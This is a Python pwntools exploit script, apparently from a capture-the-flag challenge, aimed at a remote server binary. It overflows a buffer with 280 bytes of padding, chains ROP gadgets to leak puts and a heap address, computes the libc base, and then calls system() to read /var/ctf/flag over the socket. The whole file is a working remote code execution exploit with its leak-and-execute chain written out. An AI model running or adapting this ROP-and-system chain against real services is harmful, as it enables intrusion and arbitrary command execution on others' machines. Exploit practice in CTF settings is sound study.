#!/usr/bin/python
from pwn import *
import sys, time, os

local = False
context.log_level = 'error'
elf = ELF('/exploit/server')
rop = ROP(elf)
prdi = rop.find_gadget(['pop rdi', 'ret'])
prsi = rop.find_gadget(['pop rsi'])
print prsi
print prdi
prdi = prdi.address
prsi = prsi.address
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./libc.so.6')
p = remote(sys.argv[1], int(sys.argv[2]))
seq = 0

def r(delim='\n'):
  p.recvuntil(delim)

def s(st, line=True):
  if line:
    p.sendline(st)
  else:
    p.send(st)

pay = 'A'*280
pay += p64(prdi) + p64(4) + p64(prsi) + p64(elf.got['puts']) + p64(0) + p64(elf.symbols['sendListHandle'])
pay += p64(prdi) + p64(4) + p64(prsi) + p64(elf.symbols['buf']) + p64(0) + p64(elf.symbols['sendListHandle'])
pay += p64(prdi) + p64(4) + p64(elf.symbols['tcp_receive'])
p.sendline(pay)

l = ord(p.recvn(1, timeout=3))
libcbase = u64(p.recvn(l).ljust(8, '\x00')) - libc.symbols['puts']
print 'LIBC :', hex(libcbase)
l = ord(p.recvn(1, timeout=3))
heap = u64(p.recv(l).ljust(8, '\x00'))
print 'HEAP :', hex(heap)
system = libcbase + libc.symbols['system']

pay = 'A'*280
pay += p64(prdi) + p64(heap + 304) + p64(system)
pay += '/bin/cat /var/ctf/flag 1>&4\x00'
p.sendline(pay)
p.sendline('\n')

print p.recv()
p.close()
  

